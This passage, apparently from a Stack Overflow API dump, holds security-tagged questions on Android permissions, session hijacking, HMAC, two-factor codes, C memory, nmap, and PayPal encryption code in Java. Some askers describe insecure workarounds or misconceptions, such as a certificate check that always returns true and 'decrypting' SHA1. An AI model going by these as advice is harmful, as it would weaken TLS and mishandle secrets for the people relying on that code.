suggestions?</p>\n"},{"tags":["android","security","permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":569,"score":1,"question_id":7339743,"title":"Android permissions: How can I learn which are dangerous vs normal?","body":"<p>Android defines a set of permissions that third-party apps can request.  <a href=\"http://developer.android.com/guide/topics/manifest/permission-element.html#plevel\" rel=\"nofollow\">Permissions are categorized by sensitivity; most permissions are either \"normal\" or \"dangerous\"</a>.  Normal permissions are granted automatically, without prompting the user; dangerous permissions are presented to the user when the app is installed and the user is asked to consent to granting them.</p>\n\n<p>Question: For any particular Android permission I have in mind, how can I tell whether it is a normal permission or a dangerous permission?  Is there a list of dangerous permissions and a list of normal permissions?</p>\n\n<p>(I know that third-party apps can declare their own permissions.  I'm only asking about standard permissions.  I know it may not be possible to get a 100%-complete list.  I'm only looking for best-effort; something is better than nothing.)</p>\n\n<p>For a related but different question, see also  <a href=\"http://stackoverflow.com/q/4237982/781723\">Where can I get a list of Android permissions</a> (however, that's a different question; it doesn't at the normal vs dangerous distinction, and I don't necessarily need a complete list).</p>\n"},{"tags":["mysql","facebook","security","user"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12102185,"title":"creating user table in MySql populated with only the Facebook ID?","body":"<p>I would like best practices and advice about creating a new 'user' table in MySql that will NOT store the reg user/pass in it, but will store the facebook ID that will be given to me by Facebook.</p>\n\n<p>Normally, I'd worry about random Hashing everything in there, but... do I still need to do that? if there's NO personal information tied in to their facebook ID, i don't see a reason to change anything... </p>\n\n<p>so, Stack Overflow MySql Geniuses, tell me the best way to do this...</p>\n"},{"tags":["php","security"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":159,"score":0,"question_id":2486091,"title":"is it possible to stop an automated request from particular ip","body":"<p>I am getting automated request from some ips i have blocked the IP now its coming from some other IP.</p>\n\n<p>Is it possible to detect the automated request and block the IP programtically?</p>\n"},{"tags":["database","security","web-applications","two-factor-authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12095681,"title":"Best way to store \"backup codes\" for two-factor authentication?","body":"<p>I'm implementing a two-factor authentication system for one of my side projects and would like to institute some \"one time codes\", much like Google has for their two-factor authentication.</p>\n\n<p>My question is, what would be the safest way to store these codes on the server? Do they need to be encrypted in the database? Would I use something like bcrypt to has them the same way I hash passwords? I would think that might be overkill considering an attacker would know each hash represents a 6 digit number which would bring brute force times down to almost nothing.</p>\n"},{"tags":["php","security","validation","session","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12104221,"title":"Regenerate session ID without invalidating the previous one?","body":"<p>I have a situation where my system detects if cookie has been hijacked. If I clone the cookie between two different browsers, then my system can kill the session cookie on a browser that is the clone and thus protect the original session.</p>\n\n<p>But I have a problem. How can I regenerate a new session ID value for the cloned browser in the same session? I would essentially give clone a new session ID that is clean of the original session ID data, without affecting the original session ID data.</p>\n\n<p>This is what currently happens on my clone:</p>\n\n<ul>\n<li>System detects that this session was started with a different fingerprint, thus it is a clone or hijacked cookie</li>\n<li>Session data is made inaccessible, previous session data is written to disk with session_write_close() and after that the $_SESSION variable is cleared entirely.</li>\n<li>User agent (browser) is notified to remove that cloned session cookie</li>\n</ul>\n\n<p>What I want to happen though is that the cookie would not be deleted, but assigned with a new - different - session ID, so that instead of deleting the current session, a new one would be made that is empty.</p>\n\n<p>I cannot use session_regenerate_id(), because that wants sessions to be started and it would start the previous session rather than a new one and my previous original session data would be lost and not accessible from the previous one. I can assign a new session ID with a session_id() function and then use that, but how can I generate the session ID value that is as secure as the one that PHP itself generates?</p>\n\n<p>Basically all I want to do is that if I detect a cloned session, then I still want to start sessions, but I want to replace the session ID of the cloned session while keeping the original session still alive.</p>\n"},{"tags":["web-services","security","servicestack"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":482,"score":2,"question_id":12095094,"title":"ServiceStack web services security","body":"<p>Hi I am new to working with Servicestack and have downloaded their very comprehensive bootstrapapi example and am working with it, but am still having some issues. The issue is with security, what is happening is I am getting 405 errors when trying to access the protected services. Using the authenticate service it appears that I am authenticating correctly. Please help and explain.  Here is the code:\n</p>\n\n<pre><code>public class Hello\n{\n    public string Name { get; set; }\n}\n\npublic class AuthHello\n{\n    public string Name { get; set; }\n}\n\npublic class RoleHello\n{\n    public string Name { get; set; }\n}\npublic class HelloResponse\n{\n    public string Result { get; set; }\n}\n</code></pre>\n\n<p>The Services:\n</p>\n\n<pre><code>public class HelloService : ServiceBase&lt;Hello&gt; \n{\n\n    //Get's called by all HTTP Verbs (GET,POST,PUT,DELETE,etc) and endpoints JSON,XMl,JSV,etc\n    protected override object Run(Hello request)\n    {\n        return new HelloResponse { Result = \"Hello, Olle r en L l \" + request.Name };\n    }\n}\n\n[Authenticate()]\npublic class AuthHelloService : RestServiceBase&lt;AuthHello&gt;\n{\n    public object Execute(Hello request)\n    {\n        return new HelloResponse { Result = \"Hello, \" + request.Name };\n    }\n}\n\n[RequiredRole(\"Test\")]\npublic class RoleHelloService : RestServiceBase&lt;RoleHello&gt;\n{\n    public object Execute(Hello request)\n    {\n        return new HelloResponse { Result = \"Hello, \" + request.Name };\n    }\n}\n</code></pre>\n\n<p>Here is the AppHost:\n</p>\n\n<pre><code>public class HelloAppHost : AppHostBase\n    {\n        //Tell Service Stack the name of your application and where to find your web services\n\n\n\n        public HelloAppHost() : base(\"Hello Web Services\", typeof(HelloService).Assembly) { }\n\n        public override void Configure(Container container)\n        {\n\n            //Register all Authentication methods you want to enable for this web app.\n        Plugins.Add(new AuthFeature(() =&gt; new AuthUserSession(), new IAuthProvider[] {new CustomCredentialsAuthProvider(), //HTML Form post of UserName/Password credentials\n            }));\n        container.Register&lt;ICacheClient&gt;(new MemoryCacheClient() { FlushOnDispose = false });\n\n            //register user-defined REST-ful urls\n            Routes\n              .Add&lt;Hello&gt;(\"/hello\")\n              .Add&lt;Hello&gt;(\"/hello/{Name}\")\n              .Add&lt;AuthHello&gt;(\"/AuthHello\")\n              .Add&lt;RoleHello&gt;(\"/RoleHello\");\n        }\n    }\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Everything works as expect if you replace : RestServiceBase with : ISevice so now the question is why.</p>\n"},{"tags":[".net","security","firefox","mono","ssl-certificate"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":1017,"score":3,"question_id":3285489,"title":"Mono problems with cert and mozroots","body":"<p>I am using this command on my mono VM</p>\n\n<pre><code>sudo mozroots --import --sync\n</code></pre>\n\n<p>It appears to be getting the cert from <a href=\"http://lxr.mozilla.org/seamonkey/source/security/nss/lib/ckfw/builtins/certdata.txt\" rel=\"nofollow\">this site</a>. </p>\n\n<p>I then try to connect to my ssl site and i get the exception that the cert is invalid. I use firefox and see the cert was issued in 2010. I looked at that file and see the last time its been updated was 2009-05-21 12:50</p>\n\n<p>When using firefox on the same machine i can navigate to the same url i am trying to connect to and i get no ssl issues. (no alert nor asking me to add it to an exception).</p>\n\n<p>I am confused here. How do i update mono to use the latest certs?</p>\n\n<p>-edit- I checked who signed the cert of the site i want to visit and their name is in certdata. I wonder why mono says the cert is not valid.</p>\n\n<hr>\n\n<p>I tried writing this and i hit yes to the 3 cert it asked me to import</p>\n\n<pre><code>certmgr -ssl https://www.site.com/users/login --machine\n</code></pre>\n\n<p>I ran my application again and got this error. Googling the error code 0xffffffff80092012 i <a href=\"http://www.mail-archive.com/mono-bugs@lists.ximian.com/msg74638.html\" rel=\"nofollow\">found this</a>. </p>\n\n<p>Looks like a fixed bug that hasnt been applied to 2.6.4. Or i could be doing it wrong. I do set the ServerCertificateValidationCallback to my own thing and return true for this application as a fix for mono.</p>\n\n<blockquote>\n  <p>System.Net.WebException: Error getting\n  response stream (Write: The\n  authentication or decryption has\n  failed.): SendFailure --->\n  System.IO.IOException: The\n  authentication or decryption has\n  failed. --->\n  Mono.Security.Protocol.Tls.TlsException:\n  Invalid certificate received from\n  server. Error code: 0xffffffff80092012</p>\n</blockquote>\n"},{"tags":["security","api","http","authentication","hmac"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12100611,"title":"HMAC message formatting","body":"<p>When using HMAC to authenticate an API call, often the message to be hashed includes a lot of stuff that doesn't seem to add anything. For example, here are the steps for a generating the signature for an API:</p>\n\n<p><code>hmacsha1(HTTP VERB + URI + JSON_REQUEST_CONTENT + DATETIME, \"secret\")</code></p>\n\n<p>Why not just go like:</p>\n\n<p><code>hmacsha1(JSON_REQUEST_CONTENT, \"secret\")</code></p>\n\n<p>This is assuming that JSON_REQUEST_CONTENT is a JSON string that contains all of the relevant request information.</p>\n\n<p>It seems to me like adding the HTTP VERB and URI (or whatever extra non-content-specific info) is just adding to the length of the message, and I don't understand the benefit.</p>\n\n<p>Thanks!</p>\n"},{"tags":["ruby-on-rails","security","cookies","sinatra"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":217,"score":2,"question_id":12100350,"title":"Is Rack::Session::Cookie secure when used with a session_secret?","body":"<p>How secure is the strategy used in which the cookie consists of base64 encoded array content followed by (I believe) a SHA1 hash of that content salted with a long session_secret known only to the server?  The hash is, as I understand it, a signature to prevent the client from tampering with the cookie contents.  Is this system secure?  In particular, could an attacker figure out how to forge the signature without having access to the session_secret?  Are there any other vulnerabilities?</p>\n"},{"tags":["php","security","ssl","service","tls"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":661,"score":3,"question_id":6586357,"title":"How to secure a RESTful php web service with SSL/TLS and/or Message level security","body":"<p>I have a RESTful web service written in php that uses JSON for communication. Some of the data transmitted is really sensitive (passwords) and I am looking for a way to achieve a reasonable security level for the service. The client is a silverlight 4 application.</p>\n\n<p>I have been searching for clear information on how to implement SSL/TLS(I assume that client certificate authentication falls in that category?) and Message level security, but I cannot find good examples regarding the actual implementation of these security measures in a php+json web service. I would be very grateful for any information and practical examples. I am aware of the principles, I am just not very experienced with php.\nCurrently the only security measure that I have in place is a very basic authentication token system, which upon successful login creates a server side session and supplies the user with an authentication token for any further communication(until the session expires or the user connects from a different IP). I really want to at least secure the sensitive traffic such as passwords.</p>\n\n<p>Finally, what are the security issues that I have to look out for after implementing TLS and maybe message layer security, as in vulnerabilities and exploits? </p>\n\n<p>Thank you in advance. </p>\n"},{"tags":["c","security","coding-style","tr24731"],"answer_count":4,"favorite_count":11,"up_vote_count":34,"down_vote_count":0,"view_count":2664,"score":34,"question_id":372980,"title":"Do you use the TR 24731 'safe' functions?","body":"<p>The ISO C committee (<a href=\"http://www.open-std.org/JTC1/SC22/WG14/\" rel=\"nofollow\">ISO/IEC JTC1/SC21/WG14</a>) has published <a href=\"http://www.open-std.org/JTC1/SC22/WG14/www/projects#24731-1\" rel=\"nofollow\">TR 24731-1</a> and is working on <a href=\"http://www.open-std.org/JTC1/SC22/WG14/www/projects#24731-1\" rel=\"nofollow\">TR 24731-2</a>:</p>\n\n<blockquote>\n  <h3>TR 24731-1: Extensions to the C Library Part I: Bounds-checking interfaces</h3>\n  \n  <p>WG14 is working on a TR on safer C library functions. This TR is oriented towards modifying existing programs, often by adding an extra parameter with the buffer length. The latest draft is in document N1225. A rationale is in document N1173. This is to become a Technical Report type 2.</p>\n  \n  <h3>TR 24731-2: Extensions to the C Library - Part II: Dynamic allocation functions</h3>\n  \n  <p>WG14 is working on a TR on safer C library functions. This TR is oriented towards new programs using dynamic allocation instead of an extra parameter for the buffer length. The latest draft is in document N1337. This is to become a Technical Report type 2.</p>\n</blockquote>\n\n<h2>Questions</h2>\n\n<ul>\n<li>Do you use a library or compiler with support for the TR24731-1 functions?</li>\n<li>If so, which compiler or library and on which platform(s)?</li>\n<li>Did you uncover any bugs as a result of fixing your code to use these functions?</li>\n<li>Which functions provide the most value?</li>\n<li>Are there any that provide no value or negative value?</li>\n<li>Are you planning to use the library in the future?</li>\n<li>Are you tracking the TR24731-2 work at all?</li>\n</ul>\n"},{"tags":["asp.net","asp.net-mvc","security","web-security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":116,"score":1,"question_id":12082062,"title":"Securing ajax calls in a ASP.NET MVC application","body":"<p>I have an ASP.NET MVC based application that allows different levels of access depending on the user.  The way it currently works is when a user accesses a page, a check is done against the database to determine the rights that user has.  The view is then selected based on the level of access that user has. Some users see more data and have more functionality available to them than do others.  Each page also makes a variety of ajax calls to display and update the data displayed on the page.</p>\n\n<p>My question is what is the best way to ensure that a particular ajax call originated from the view and was not crafted manually to return or update data the user does not have access to?  I would prefer not to have to go to the database to re-check every time an ajax call is made since that was already done when the user initially loaded the page.</p>\n"},{"tags":["c","security"],"answer_count":5,"favorite_count":0,"up_vote_count":7,"down_vote_count":1,"view_count":161,"score":6,"question_id":12095135,"title":"Are uninitialized values ever a security risk?","body":"<p>While learning C, I made some mistakes and printed elements of a character array that were uninitialized.</p>\n\n<p>If I expand the size of the array to be quite large, say 1 million elements in size and then print the contents, what comes out is not always user unreadable, but seems to contain some runtime info.</p>\n\n<p>Consider the following code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nmain() {\n\n        char s[1000000];\n        int c, i;\n\n        printf(\"Enter input string:\\n\");\n        for (i = 0; ( c = getchar()) != '\\n'; i++) {\n                s[i] = c;\n        }   \n\n        printf(\"Contents of input string:\\n\");\n        for (i = 0; i &lt; 999999; i++) {\n                putchar(s[i]);\n        }   \n        printf(\"\\n\");\n\n        return 0;\n}\n</code></pre>\n\n<p>Just scrolling through the output, I find things such as:</p>\n\n<blockquote>\n  <p>??<em>?l??</em>??????_dyldVersionNumber_dyldVersionString_dyld_all_image_infos_dyld_fatal_error_dyld_shared_cache_ranges_error_string__mh_dylinker_header_stub_binding_helper_dyld_func_lookup_offset_to_dyld_all_image_infos__dyld_start__ZN13dyldbootstrapL30randomizeExecutableLoadAddressEPK12macho_headerPPKcPm__ZN13dyldbootstrap5startEPK12macho_headeriPPKcl_<em>ZN4dyldL17setNewProgramVarsERK11ProgramVars</em>_ZN4dyld17getExecutablePathEv_<em>ZN4dyld22mainExecutablePreboundEv</em>_ZN4dyld14mainExecutableEv__ZN4dyld21findImageByMachHeaderEPK11mach_header__ZN4dyld26findImageContainingAddressEPKv</p>\n</blockquote>\n\n<p>and also,</p>\n\n<blockquote>\n  <p>Apple Inc.1&amp;0$U ?0?*?H??ot CA0?\"0ple Certification Authority10U\n  ?    ??GP??^y?-?6?WLU????Kl??\"0?>?P  ?A?????f?$k????z\n                                                            ?G?[?73??M?i??r?]?_???d5#KY?????P??XPg? ?,\n  op??0??C??=?+I(????^??=?:??? ?b??q?GSU?/A????p??LE~LkP?A??tb<br>\n  ?!.t?&lt;\n                                 ?A?3???0X?Z2?h???es?g^e?I?v?3e?w??-??z0?v0U?0U?0?0U+?iG?v  ??k?.@??GM^0U#0?+?iG?v  ??k?.@??GM^0?U\n  0?0?  <em>?H??cd0??0+https://www.apple.com/appleca/0?+0????Reliance on\n  this certificate by any party assumes acceptance of the then\n  applicable standard terms and conditions of use, certificate\n  poli?\\6?L-x???w??v?w0O????=G7?@?,??s???d?yO4>?x?k??}9??S ?8??O\n  01</em>?H??[d?c3w?:,V??!sO??6?U??2B???q?~?R??B$*??M?^c?K?P????????7?uu!0?0??0</p>\n</blockquote>\n\n<p>I believe one time my <code>$PATH</code> environment variable was even printed out.</p>\n\n<p>Can the contents of an uninitialized variable ever pose a security risk?</p>\n\n<p><strong>Update 1</strong></p>\n\n<p><img src=\"http://i.stack.imgur.com/W5sSp.jpg\" alt=\"Motivator\"></p>\n\n<p><strong>Update 2</strong></p>\n\n<p>So it seems clear from the answers that this is indeed a security risk. This surprises me.</p>\n\n<p>Is there no way for a program to declare its memory content protected to allow the OS to restrict any access to it other than the program that initialized that memory?</p>\n"},{"tags":["c++","security","vtable"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":110,"score":0,"question_id":12096902,"title":"Where are virtual tables really stored, and why can't we modify them?","body":"<p>I know the vtables are stored as read-only in memory to prevent modifications. Which section is exactly storing vtables?</p>\n\n<p>Another question, according to read-only privileges that vtables have, how they got modified in exploit writing process?</p>\n"},{"tags":["security","networking","vm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12095756,"title":"How to create or simulate internet network lab?","body":"<p>How to create and simulate internet enviorment in a lab meaning in winodws enviorment without any hardware ?\nI want to simulate internet network that have some client and LAN connected to it.</p>\n\n<p>Thank</p>\n"},{"tags":["linux","security","centos","port","nmap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":11570654,"title":"Nmap: server stops accepting new connections after nmap runs","body":"<p>I have a CentOS 6 server with nmap 5.51 installed on it. I issue the following command:</p>\n\n<pre><code>nmap -sS -PN -p1-1024 --traceroute --reason -O -sV {My IP} -vv\n\n(This is all \"don't quote me\")\n-sS is a type of scan where TCP connections are not fully established\n-PN means skip checking if host is online\n-p1-65535 is the port range\n--traceroute means add traceroute\n--reason \"Shows the reason each port is set to a specific state and the reason each host is up or down.\"\n-O means OS detection\n-sV detects the version of the program listening on each port\n-vv means \"be verbose\"\n</code></pre>\n\n<p>So anyway... I run this command, wait a few minutes, it prints the result and EXITS. I open another terminal window (or tab), try to connect to that same server through SSH... And the connection times out. This happens every time, and only after running nmap. Rebooting is the only thing that fixes it. </p>\n\n<p>It seems that if I already have a connection, it keeps communicating, but new ones get refused. Like I said, nmap has already exited, and I made sure it's not in the process list (ps uax | grep nmap). </p>\n\n<p>And another thing, the weirdest of all: everything is fine while nmap runs. It's when it goes away that shenanigans start.</p>\n\n<p>But this is not consistent. When I added the argument -T2 (\"polite\" scanning), the server went down instantly, including existing connections.</p>\n\n<p>What next?</p>\n\n<p>Note that the server that screws up is the one that does the scanning, not the target.</p>\n"},{"tags":["php","security","scp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12096382,"title":"Using PHP to copy files from a ScreenOS device","body":"<p>I am making a script to backup configs for firewalls. One thing I want to do is <code>scp</code> files from ScreenOS devices, but I get a blank line from the CLI.</p>\n\n<p>What I need to do in build this functionality into an already existing web interface, so I need to be able to run this command from within PHP. </p>\n\n<p>I have looked at <code>shell_exec</code>, <code>system</code>, etc, but im haivng issues at the CLI level running the commands.</p>\n\n<p>Any help is appreciated.</p>\n"},{"tags":["ajax","security","post"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":63,"score":2,"question_id":12095269,"title":"Can someone just make a post to register.php and register one billion accounts?","body":"<p>Is it possible to create a script that is executed outside of the server,\nor with a browser add-on for example it automatically fills in form values, then submits the form all ready to be parsed by the server ? this way in three minutes a billion fake accounts could get registered very easily, imagine facebook which does not use any visible to the human captcha, a browser add on that performs the form submission and inserts the vals retrieved from a local database for new emails to be associated as that is a check - no duplicate emails, can thousands and thousands of fake accounts be created each day accross the globe?</p>\n\n<p>What is the best method to prevent fake accounts? Even imagining the scenario of a rotating ips center with human beings registering just to choke the databases, achieving 30-50 million accounts in a year. Thanks</p>\n"},{"tags":["security","spring-mvc","shiro"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":198,"score":0,"question_id":10333807,"title":"Shiro Annotations with Spring","body":"<p>i am new to shiro i am integrating shiro with spring and i am trying to use shiro annotations \non Spring controllers but they are not working , \nthe controller stop working when i put the @RequiresPermissions(\"W027:UPDT\") \non the Controller method . \nany help guys/ \nthanks</p>\n"},{"tags":["java","security","file","jar"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12079344,"title":"Is .jar file protected by reading/editing?","body":"<p>I am currently creating some little Framed application in java.</p>\n\n<p>When we clean an built a main project with netbeans (therefore creating a jar file), does it create a secured jar file ?</p>\n\n<p>What I mean is that mine contains some tables with keys and I don't want that future users can be able to watch these key logs.\nSo is the code totally hiden ? In case not, how can we \"protect\" jar files please?</p>\n\n<p>Thank you in advance for your help, please let me know if I wasn't clear enough.</p>\n\n<p>EDIT :  I am currently under windows 7</p>\n"},{"tags":["ios","wcf","security","windows-phone-7","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12085600,"title":"Encrypt decrypt the text, compatible to all mobile platforms and wcf services","body":"<p>I want to encrypt a parameter(which consist of sensitive data) while sending to server(WCF Service) using SHA1 algorithm, On server end I'll decrypt the string and use it.</p>\n\n<blockquote>\n  <p>This way i can ensure any third party won't read my sensitive data so easily.</p>\n</blockquote>\n\n<p>How do I encrypt the string in windows phone 7 using SHA1 algorithm and decrypt the same in my WCF service.</p>\n\n<blockquote>\n  <p>Encrypted string may come to server from iPhone, android or WP7; How do I ensure that every client will produce the same result in server.</p>\n</blockquote>\n\n<h2>Update:</h2>\n\n<p>Can I use AES algorithm for above requirement? </p>\n"},{"tags":["java","security","applet","mixed-code"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":3027,"score":4,"question_id":2608383,"title":"Why does Java tell me my applet contains both signed and unsigned code?","body":"<p>My signed Java applet has been running fine until Java update 19.  Now some but not all of our users on Java Update 19 report a java security message stating that our applet contains both signed and unsigned code.</p>\n\n<p>The process for creating our applet is as follows:</p>\n\n<ol>\n<li>Clean and Build the applet project in Netbeans IDE.</li>\n<li>Open the Applet jar file in WinRAR and add the required mysql JDBC driver .class files to the jar file.</li>\n<li>Sign the applet jar file.</li>\n</ol>\n\n<p>Can someone please tell me how to determine what code is signed and what code is not signed in our applet?  Is there a better way to include the mysql JDBC driver jar file in our applet other than copying the jar file contents into our applet jar file?</p>\n\n<p>Thanks</p>\n"},{"tags":["svn","security","encryption","passwords"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":522,"score":5,"question_id":2421273,"title":"SVN server side password security","body":"<p>Our inhouse <a href=\"http://en.wikipedia.org/wiki/Windows_Server_2003\" rel=\"nofollow\">Windows 2003 Server</a> hosts our company's SVN repository. I'm looking for a secure method, preferably encryption, for the server-side passwords. Right now, they're stored in clear text. Is there a SVN plugin or method that I can use to achieve this?</p>\n"},{"tags":["c#",".net","security","cryptography","rsa"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":119,"score":1,"question_id":12092554,"title":"RSA Encryption, Key storage","body":"<p>I'm writing a .NET application that uses a third party api. What is the best way to store the api credentials? I'm thinking of encrypting them using the RSACryptoServiceProvider, my question though is: If I encrypt my credentials using RSA I'll have to have the private key somewhere in the application to decrypt the credentials, wouldn't that mean that the encryption is basically irrelevant? Because anyone could just go ahead and take the encrypted credentials and use the the key I have to provide to decrypt the credentials.</p>\n\n<p>What is the best way to handle the private key and keep from anyone who uses my application?</p>\n\n<p>Can the key be read if I store it as a string somewhere in my class?</p>\n"},{"tags":["java","security","exception","encryption","paypal"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":8033,"score":4,"question_id":6363801,"title":"InvalidKeyException : Illegal Key Size - Java code throwing exception for encryption class - how to fix?","body":"<p>I've been trying to get some working Java code to use for encrypting Paypal buttons. This is no easy task! Even when I get some code, from Paypal, I'm faced with errors..ugh..</p>\n\n<p>So here is what I have so far, that I think will work eventually.</p>\n\n<p>I downloaded the Java.zip file from Paypal's website. Within it are two classes - ClientSide.java and ButtonEncryption.java</p>\n\n<p><strong>The Problem -</strong> I'm getting an <code>InvalidKeyException : Illegal key size</code> error.</p>\n\n<p><strong>Questions</strong><br/>\n1) How do I resolve this issue? 2) What line of code is throwing the error?</p>\n\n<pre><code>C:\\jakarta-tomcat\\webapps\\PlanB\\WEB-INF\\classes&gt;java palmb.servlets.paypal.ButtonEncryption\njava.io.IOException: exception decrypting data - java.security.InvalidKeyException: Illegal key size\n        at org.bouncycastle.jce.provider.JDKPKCS12KeyStore.cryptData(Unknown Source)\n        at org.bouncycastle.jce.provider.JDKPKCS12KeyStore.engineLoad(Unknown Source)\n        at java.security.KeyStore.load(Unknown Source)\n        at palmb.servlets.paypal.ClientSide.getButtonEncryptionValue(ClientSide.java:63)\n        at palmb.servlets.paypal.ButtonEncryption.main(ButtonEncryption.java:81)\n</code></pre>\n\n<p><br/></p>\n\n<h1>ClientSide class</h1>\n\n<pre><code>package palmb.servlets.paypal;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.PrintWriter;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.NoSuchProviderException;\nimport java.security.PrivateKey;\nimport java.security.UnrecoverableKeyException;\nimport java.security.cert.CertStore;\nimport java.security.cert.CertStoreException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.CollectionCertStoreParameters;\nimport java.security.cert.X509Certificate;\nimport java.util.ArrayList;\nimport java.util.Enumeration;\n\nimport org.bouncycastle.cms.CMSEnvelopedData;\nimport org.bouncycastle.cms.CMSEnvelopedDataGenerator;\nimport org.bouncycastle.cms.CMSException;\nimport org.bouncycastle.cms.CMSProcessableByteArray;\nimport org.bouncycastle.cms.CMSSignedData;\nimport org.bouncycastle.cms.CMSSignedDataGenerator;\nimport org.bouncycastle.openssl.PEMReader;\nimport org.bouncycastle.util.encoders.Base64;\n\n/**\n */\npublic class ClientSide \n{\n    private String  keyPath;\n    private String  certPath;\n    private String  paypalCertPath;\n    private String  keyPass;\n\n    public ClientSide( String keyPath, String certPath, String paypalCertPath, String keyPass )\n    {\n        this.keyPath = keyPath;\n        this.certPath = certPath;\n        this.paypalCertPath = paypalCertPath;\n        this.keyPass = keyPass;\n    }   \n\n    public String getButtonEncryptionValue(String _data, String _privateKeyPath, String _certPath, String _payPalCertPath,\n                                            String _keyPass) throws IOException,CertificateException,KeyStoreException,\n                                            UnrecoverableKeyException,InvalidAlgorithmParameterException,NoSuchAlgorithmException,\n                                            NoSuchProviderException,CertStoreException,CMSException {\n        _data = _data.replace(',', '\\n');\n        CertificateFactory cf = CertificateFactory.getInstance(\"X509\", \"BC\");\n\n        // Read the Private Key\n        KeyStore ks = KeyStore.getInstance(\"PKCS12\", \"BC\");\n        ks.load( new FileInputStream(_privateKeyPath), _keyPass.toCharArray() );\n\n        String keyAlias = null;\n        Enumeration aliases = ks.aliases();\n        while (aliases.hasMoreElements()) {\n            keyAlias = (String) aliases.nextElement();\n        }\n\n        PrivateKey privateKey = (PrivateKey) ks.getKey( keyAlias, _keyPass.toCharArray() );\n\n        // Read the Certificate\n        X509Certificate certificate = (X509Certificate) cf.generateCertificate( new FileInputStream(_certPath) );\n\n        // Read the PayPal Cert\n        X509Certificate payPalCert = (X509Certificate) cf.generateCertificate( new FileInputStream(_payPalCertPath) );\n\n        // Create the Data\n        byte[] data = _data.getBytes();\n\n        // Sign the Data with my signing only key pair\n        CMSSignedDataGenerator signedGenerator = new CMSSignedDataGenerator();\n\n        signedGenerator.addSigner( privateKey, certificate, CMSSignedDataGenerator.DIGEST_SHA1 );\n\n        ArrayList certList = new ArrayList();\n        certList.add(certificate);\n        CertStore certStore = CertStore.getInstance( \"Collection\", new CollectionCertStoreParameters(certList) );\n        signedGenerator.addCertificatesAndCRLs(certStore);\n\n        CMSProcessableByteArray cmsByteArray = new CMSProcessableByteArray(data);\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        cmsByteArray.write(baos);\n        System.out.println( \"CMSProcessableByteArray contains [\" + baos.toString() + \"]\" );\n\n        CMSSignedData signedData = signedGenerator.generate(cmsByteArray, true, \"BC\");\n\n        byte[] signed = signedData.getEncoded();\n\n        CMSEnvelopedDataGenerator envGenerator = new CMSEnvelopedDataGenerator();\n        envGenerator.addKeyTransRecipient(payPalCert);\n        CMSEnvelopedData envData = envGenerator.generate( new CMSProcessableByteArray(signed),\n                CMSEnvelopedDataGenerator.DES_EDE3_CBC, \"BC\" );\n\n        byte[] pkcs7Bytes = envData.getEncoded();\n\n\n        return new String( DERtoPEM(pkcs7Bytes, \"PKCS7\") );\n\n    }\n\n    public static byte[] DERtoPEM(byte[] bytes, String headfoot) \n    {\n        ByteArrayOutputStream pemStream = new ByteArrayOutputStream();\n        PrintWriter writer = new PrintWriter(pemStream);\n\n        byte[] stringBytes = Base64.encode(bytes);\n\n        System.out.println(\"Converting \" + stringBytes.length + \" bytes\");\n\n        String encoded = new String(stringBytes);\n\n        if (headfoot != null) {\n            writer.print(\"-----BEGIN \" + headfoot + \"-----\\n\");\n        }\n\n        // write 64 chars per line till done\n        int i = 0;\n        while ((i + 1) * 64 &lt; encoded.length()) {\n            writer.print(encoded.substring(i * 64, (i + 1) * 64));\n            writer.print(\"\\n\");\n            i++;\n        }\n        if (encoded.length() % 64 != 0) {\n            writer.print(encoded.substring(i * 64)); // write remainder\n            writer.print(\"\\n\");\n        }\n        if (headfoot != null) {\n            writer.print(\"-----END \" + headfoot + \"-----\\n\");\n        }\n        writer.flush();\n        return pemStream.toByteArray();\n    }\n\n}\n</code></pre>\n\n<p><br/></p>\n\n<h1>ButtonEncryption class</h1>\n\n<pre><code>package palmb.servlets.paypal;\n\n//import com.paypal.crypto.sample.*;\n\nimport palmb.servlets.paypal.ClientSide;\n\nimport java.io.*;\nimport java.security.InvalidAlgorithmParameterException;\nimport java.security.KeyStoreException;\nimport 